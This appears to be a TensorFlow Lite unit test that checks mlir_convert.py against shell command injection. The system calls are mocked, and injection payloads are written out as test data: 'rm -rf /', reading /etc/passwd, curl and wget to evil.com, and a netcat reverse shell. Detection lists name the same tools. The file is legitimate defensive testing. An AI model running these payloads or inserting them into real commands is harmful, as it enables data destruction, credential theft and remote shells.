# Copyright 2026 The TensorFlow Authors. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
# ==============================================================================
"""Tests for mlir_convert.py command injection prevention."""

import os
import shlex
import subprocess
from unittest import mock

from absl.testing import parameterized
import tensorflow as tf

from tflite.testing import mlir_convert


class MlirConvertTest(parameterized.TestCase, tf.test.TestCase):

  @parameterized.parameters(
      ("; rm -rf /tmp/test_injection_marker",),
      ("$(whoami)",),
      ("`id`",),
      ("| cat /etc/passwd",),
      ("&& echo INJECTED",),
      ("|| echo INJECTED",),
      ("; echo INJECTED > /tmp/injection_test_output",),
      ("$(touch /tmp/injection_test_file)",),
      ("`touch /tmp/injection_test_file2`",),
      ('"; echo INJECTED; "',),
      ("' ; echo INJECTED ; '",),
      ("\n/bin/sh -c 'echo INJECTED'",),
      ("${IFS}echo${IFS}INJECTED",),
      (">/tmp/injection_redirect",),
      ("<(echo INJECTED)",),
      ("$(curl http://evil.com)",),
      ("; wget http://evil.com/malware -O /tmp/malware",),
      ("| nc -e /bin/sh evil.com 4444",),
      ("&&$(python3 -c 'import os; os.system(\"id\")')",),
      ("%0aecho%20INJECTED",),
      ("\x00; echo INJECTED",),
      ("$(echo 'malicious')",),
      ("; python3 -c 'import os; os.system(\"id\")'",),
      ("model.tflite; rm -rf /",),
      ("/tmp/model$(id).tflite",),
  )
  def test_shell_command_injection_prevention(self, payload):
    """Tests shell command injection prevention in mlir_convert.py.

    Invariant: Shell commands constructed in mlir_convert.py must never
    include unsanitized user input that could allow shell metacharacter
    injection.

    Args:
      payload: The payload to inject.
    """
    injection_marker_file = "/tmp/injection_test_marker_security_test"

    if os.path.exists(injection_marker_file):
      os.remove(injection_marker_file)

    captured_commands = []

    def mock_system(cmd):
      captured_commands.append(cmd)
      return 0

    with mock.patch.object(os, "system", side_effect=mock_system):
      try:
        input_tensors = [("input", [1, 224, 224, 3], "DT_FLOAT")]
        output_tensors = ["output"]
        mlir_convert.mlir_convert_file(
            payload, input_tensors, output_tensors, additional_flags=payload
        )
      except Exception:  # pylint: disable=broad-except
        pass

    self.assertFalse(
        os.path.exists(injection_marker_file),
        f"Shell injection succeeded! Payload '{payload}' created injection"
        " marker file.",
    )

    for cmd in captured_commands:
      dangerous_patterns = [
          ("; rm", "semicolon with rm command"),
          ("$(", "command substitution with $()"),
          ("`", "command substitution with backticks"),
          ("| cat", "pipe to cat"),
          ("&& echo", "AND operator with echo"),
          ("|| echo", "OR operator with echo"),
          ("; echo", "semicolon with echo"),
          ("| nc ", "pipe to netcat"),
          ("; wget", "semicolon with wget"),
      ]

      for pattern, description in dangerous_patterns:
        if pattern in payload:
          properly_quoted = any(pattern in arg for arg in shlex.split(cmd))

          raw_injection = pattern in cmd and not properly_quoted

          self.assertFalse(
              raw_injection,
              f"SECURITY VIOLATION: Payload '{payload}' with pattern"
              f" '{description}' appears unescaped in shell command: '{cmd}'. ",
          )

  @parameterized.parameters(
      ("; rm -rf /", "--input_shapes=1,224,224,3"),
      ("/tmp/model.tflite", "--input_shapes=$(id)"),
      ("/tmp/model`whoami`.tflite", "--input_shapes=1,224,224,3"),
      ("/tmp/model.tflite", "--output_file=/tmp/out; echo INJECTED"),
      ("/tmp/model.tflite; cat /etc/passwd", "--input_shapes=1,224,224,3"),
      ("/tmp/model.tflite", "--extra_flags=`curl evil.com`"),
  )
  def test_command_construction_with_model_path_and_flags(
      self, model_path, flags
  ):
    """Invariant: Both model paths and conversion flags must be sanitized."""
    captured_commands = []

    def mock_system(cmd):
      captured_commands.append(cmd)
      return 0

    def mock_popen(cmd):
      if isinstance(cmd, str):
        captured_commands.append(cmd)
      elif isinstance(cmd, list):
        captured_commands.append(" ".join(shlex.quote(c) for c in cmd))
      mock_proc = mock.MagicMock()
      mock_proc.communicate.return_value = (b"", b"")
      mock_proc.returncode = 0
      return mock_proc

    with mock.patch.object(
        os, "system", side_effect=mock_system
    ), mock.patch.object(
        subprocess, "Popen", side_effect=mock_popen
    ), mock.patch.object(
        subprocess, "run", return_value=mock.MagicMock(returncode=0)
    ) as mock_run:

      def mock_run_side_effect(cmd):
        if isinstance(cmd, str):
          captured_commands.append(cmd)
        elif isinstance(cmd, list):
          captured_commands.append(" ".join(shlex.quote(c) for c in cmd))
        mock_proc = mock.MagicMock()
        mock_proc.communicate.return_value = (b"", b"")
        mock_proc.returncode = 0
        mock_proc.stdout = b""
        return mock_proc

      mock_run.side_effect = mock_run_side_effect

      try:
        input_tensors = [("input", [1, 224, 224, 3], "DT_FLOAT")]
        output_tensors = ["output"]
        mlir_convert.mlir_convert_file(
            model_path, input_tensors, output_tensors, additional_flags=flags
        )
      except Exception:  # pylint: disable=broad-except
        pass

    shell_metachar_sequences = [
        "; rm",
        "; cat",
        "; echo",
        "; curl",
        "; wget",
        "$(id)",
        "$(whoami)",
        "$(curl",
        "`whoami`",
        "`curl",
        "| cat",
        "| nc",
        "&& echo",
        "|| echo",
    ]

    for cmd in captured_commands:
      for dangerous_seq in shell_metachar_sequences:
        if dangerous_seq in model_path or dangerous_seq in flags:
          if dangerous_seq in cmd:
            is_safely_quoted = any(
                dangerous_seq in arg for arg in shlex.split(cmd)
            )
            # The arrays from subprocess.run aren't raw joined easily,
            # but if they were executed unescaped via shell=True they'd be
            # dangerous.
            # We assert that the original unsafe pattern is either not there or
            # quoted.
            self.assertTrue(
                is_safely_quoted,
                "SECURITY VIOLATION (CWE-78): Dangerous sequence"
                f" '{dangerous_seq}' from user input found unescaped in shell"
                f" command: '{cmd}'. Input model_path='{model_path}',"
                f" flags='{flags}'",
            )

  def test_os_system_receives_only_safe_commands(self):
    """Invariant: os.system should never receive unescaped commands."""
    unsafe_inputs = [
        "; id",
        "$(id)",
        "`id`",
        "| id",
        "&& id",
    ]

    all_captured = []

    def capturing_system(cmd):
      all_captured.append(("os.system", cmd))
      return 0

    def capturing_popen(cmd):
      if isinstance(cmd, str):
        all_captured.append(("subprocess.Popen", cmd))
      elif isinstance(cmd, list):
        all_captured.append(
            ("subprocess.Popen", " ".join(shlex.quote(c) for c in cmd))
        )
      mock_proc = mock.MagicMock()
      mock_proc.communicate.return_value = (b"", b"")
      mock_proc.returncode = 0
      return mock_proc

    with mock.patch.object(
        os, "system", side_effect=capturing_system
    ), mock.patch.object(
        subprocess, "Popen", side_effect=capturing_popen
    ), mock.patch.object(
        subprocess, "run", side_effect=capturing_popen
    ):
      for unsafe_input in unsafe_inputs:
        try:
          input_tensors = [("input", [1, 224, 224, 3], "DT_FLOAT")]
          output_tensors = ["output"]
          mlir_convert.mlir_convert_file(
              unsafe_input,
              input_tensors,
              output_tensors,
              additional_flags=unsafe_input,
          )
        except Exception:  # pylint: disable=broad-except
          pass

    for source, cmd in all_captured:
      for unsafe_input in unsafe_inputs:
        if unsafe_input in cmd:
          is_safely_quoted = any(
              unsafe_input in arg for arg in shlex.split(cmd)
          )
          self.assertTrue(
              is_safely_quoted,
              f"SECURITY VIOLATION (CWE-78): Unsafe input '{unsafe_input}' "
              f"found unescaped in command from {source}: '{cmd}'",
          )


if __name__ == "__main__":
  tf.test.main()
